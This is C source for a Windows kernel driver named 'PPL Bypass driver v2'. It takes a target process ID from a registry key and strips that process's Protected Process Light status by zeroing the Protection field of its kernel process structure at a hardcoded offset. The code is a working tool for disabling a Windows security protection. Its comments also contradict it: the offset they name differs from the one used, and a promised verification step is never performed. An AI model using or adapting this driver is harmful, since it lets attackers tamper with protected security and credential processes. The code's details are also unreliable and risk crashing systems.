// PPL Bypass driver v2 - directly clears EPROCESS Protection field
#include <ntddk.h>

// EPROCESS Protection offset (Win11 26100)
// Determined via: dt nt!_EPROCESS <addr> Protection
// Common offsets: Win10=0x87A, Win11 22H2=0x87A, 24H2=0x87A
// If wrong offset, system may BSOD. We verify via PsGetProcessProtection first.
#define EPROCESS_PROTECTION_OFFSET 0x5FA

typedef struct _PS_PROTECTION {
    UCHAR Level;
    union {
        UCHAR Flags;
        struct {
            UCHAR Type   : 3;
            UCHAR Audit  : 1;
            UCHAR Signer : 4;
        };
    };
} PS_PROTECTION;

void DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrint("[PPLBypass] Unloaded\n");
}

NTSTATUS StripProtectionRaw(ULONG Pid) {
    PEPROCESS Process = NULL;
    NTSTATUS Status = PsLookupProcessByProcessId(ULongToHandle(Pid), &Process);
    if (!NT_SUCCESS(Status)) {
        DbgPrint("[PPLBypass] PsLookupProcessByProcessId(%lu) failed: 0x%08X\n", Pid, Status);
        return Status;
    }

    // Read current protection via raw offset
    UCHAR* protectionPtr = (UCHAR*)Process + EPROCESS_PROTECTION_OFFSET;
    UCHAR oldVal = *protectionPtr;
    DbgPrint("[PPLBypass] PID %lu: EPROCESS+0x%X = 0x%02X (before)\n", Pid, EPROCESS_PROTECTION_OFFSET, oldVal);

    // Try documented API first
    UNICODE_STRING fnSet = RTL_CONSTANT_STRING(L"PsSetProcessProtection");
    NTSTATUS (*pfnSet)(PEPROCESS, PS_PROTECTION*) = MmGetSystemRoutineAddress(&fnSet);
    if (pfnSet) {
        PS_PROTECTION NewProt = {0};
        Status = pfnSet(Process, &NewProt);
        DbgPrint("[PPLBypass] PsSetProcessProtection: 0x%08X\n", Status);
    } else {
        // Fallback: directly clear the field
        DbgPrint("[PPLBypass] PsSetProcessProtection not found, writing directly\n");
        *protectionPtr = 0;
        Status = STATUS_SUCCESS;
    }

    // Read back to verify
    UCHAR afterVal = *protectionPtr;
    DbgPrint("[PPLBypass] PID %lu: EPROCESS+0x%X = 0x%02X (after)\n", Pid, EPROCESS_PROTECTION_OFFSET, afterVal);

    if (afterVal != 0 || oldVal == 0) {
        DbgPrint("[PPLBypass] %s\n", afterVal == 0 ? "SUCCESS: Protection cleared" : "WARNING: Protection not zero");
    }

    ObDereferenceObject(Process);
    return Status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    DbgPrint("[PPLBypass] v2 Loading...\n");
    DriverObject->DriverUnload = DriverUnload;

    RTL_QUERY_REGISTRY_TABLE QueryTable[2] = {0};
    ULONG TargetPid = 0;
    QueryTable[0].Flags = RTL_QUERY_REGISTRY_DIRECT;
    QueryTable[0].Name = L"TargetPid";
    QueryTable[0].EntryContext = &TargetPid;
    QueryTable[0].DefaultType = REG_DWORD;

    NTSTATUS Status = RtlQueryRegistryValues(
        RTL_REGISTRY_ABSOLUTE,
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\PPLBypass\\Parameters",
        QueryTable, NULL, NULL);

    DbgPrint("[PPLBypass] RegQuery: status=0x%08X pid=%lu\n", Status, TargetPid);

    if (TargetPid) {
        StripProtectionRaw(TargetPid);
    }

    return STATUS_SUCCESS;
}
